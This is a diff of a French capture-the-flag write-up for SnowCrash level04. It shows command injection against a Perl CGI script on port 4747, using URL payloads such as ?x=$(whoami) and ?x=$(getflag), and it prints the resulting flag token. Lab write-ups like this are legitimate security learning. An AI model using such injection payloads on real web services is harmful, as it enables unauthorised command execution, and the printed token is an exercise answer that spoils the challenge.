@@ -19,7 +19,7 @@ level04@SnowCrash:~$ ./level04.pl
 Content-type: text/html
 ```
 
-Efdfectivement le port 4747 est bien en ecoute:
+Effectivement le port 4747 est bien en ecoute:
 ```
 level04@SnowCrash:~$ netstat -tulpen
 (No info could be read for "-p": geteuid()=2004 but you should be root.)
@@ -38,20 +38,24 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 *Pour comprendre les CGI perl --> http://www.dil.univ-mrs.fr/~chris/Documents/CGI*
 
-En se rendant sur IP:4747 on a une page blanche
+En se rendant sur IP:4747 via un navigateur,on a une page blanche. Ces manipulations peuvent aussi se faire via curl.
 
 En testant le script on voir qu'il nous renvoit ce qu'on passe en argument:
+```
 http://192.168.56.105:4747/?x=/bin/ls
 /bin/ls
+```
 
 Testons une injection de commande:
+```
 http://192.168.56.105:4747/?x=$(whoami)
 flag04
+```
 
-Bingo !
+**Bingo !**
 
+```
 http://192.168.56.105:4747/?x=$(getflag)
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
-
-
+```
 
